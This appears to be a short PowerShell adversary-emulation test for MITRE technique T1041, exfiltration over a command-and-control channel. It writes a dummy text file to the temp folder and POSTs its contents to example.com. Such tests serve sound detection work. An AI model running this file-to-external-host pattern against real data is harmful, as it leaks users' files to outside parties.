#T1041 -  Exfiltration Over C2 Channel
#Joshua O. Cabauatan

#Test #1 -  C2 Data Exfiltration

if(-not (Test-Path $env:TEMP\LineNumbers.txt)){ 
  1..100 | ForEach-Object { Add-Content -Path $env:TEMP\LineNumbers.txt -Value "This is line $_." }
}
[System.Net.ServicePointManager]::Expect100Continue = $false
$filecontent = Get-Content -Path $env:TEMP\LineNumbers.txt
Invoke-WebRequest -Uri example.com -Method POST -Body $filecontent -DisableKeepAlive